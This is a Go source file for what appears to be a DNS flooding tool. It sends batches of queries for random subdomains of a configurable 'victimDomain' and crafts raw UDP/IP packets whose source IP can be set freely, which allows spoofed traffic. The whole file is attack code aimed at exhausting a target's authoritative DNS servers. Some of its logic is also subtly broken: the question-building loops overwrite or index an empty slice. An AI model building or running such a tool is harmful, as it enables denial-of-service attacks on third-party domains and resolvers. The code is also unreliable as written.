package internal

import (
	"fmt"
	"math/rand"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"

	"github.com/miekg/dns"
)

type DNSClient struct {
	hostPort     string
	nQuestions   int
	victimDomain string
	client       *dns.Client
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

func NewDNSClient(hostPort string, nQuestions int, victimDomain string) (c DNSClient) {
	client := new(dns.Client)
	return DNSClient{
		hostPort:     hostPort,
		nQuestions:   nQuestions,
		victimDomain: victimDomain,
		client:       client,
	}
}

func (c DNSClient) SendJunkDomainsRequest() (rtt time.Duration, dnsError string, err error) {
	m := new(dns.Msg)
	for i := 0; i < c.nQuestions; i++ {
		m.SetQuestion(c.randomSubDomain(), dns.TypeA)
	}
	r, rtt, err := c.client.Exchange(m, c.hostPort)
	if err != nil {
		return
	}
	dnsError = dns.RcodeToString[r.Rcode]
	return
}

func (c DNSClient) createPacket(source, destination net.IP, sourcePort int) (packet []byte, err error) {
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	ipLayer := &layers.IPv4{
		Version:  4,
		TTL:      255,
		SrcIP:    source,
		DstIP:    destination, // resolver IP
		Protocol: layers.IPProtocolUDP,
	}
	udpLayer := &layers.UDP{
		SrcPort: layers.UDPPort(sourcePort),
		DstPort: layers.UDPPort(53),
	}
	dnsLayer := &layers.DNS{
		ID:     uint16(rand.Uint32()),
		QR:     false, // QR=0 is query
		OpCode: layers.DNSOpCodeQuery,
		RD:     true,
	}
	for i := 0; i < c.nQuestions; i++ {
		dnsLayer.Questions[i] = layers.DNSQuestion{
			Name:  []byte(c.randomSubDomain()),
			Type:  layers.DNSTypeA,
			Class: 1,
		}
	}
	err = udpLayer.SetNetworkLayerForChecksum(ipLayer)
	if err != nil {
		err = fmt.Errorf("failed to set network layer for checksum: %v", err)
		return
	}
	err = gopacket.SerializeLayers(buf, opts, ipLayer, udpLayer, dnsLayer)
	if err != nil {
		err = fmt.Errorf("failed to serialize packet: %v", err)
		return
	}
	return buf.Bytes(), nil
}

func (c *DNSClient) randomSubDomain() string {
	return fmt.Sprintf(
		"%s.%s.",
		c.randomString(32),
		c.victimDomain,
	)
}

func (c *DNSClient) randomString(maxLen int) string {
	actualLen := rand.Intn(maxLen-1) + 1
	b := make([]rune, actualLen)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}
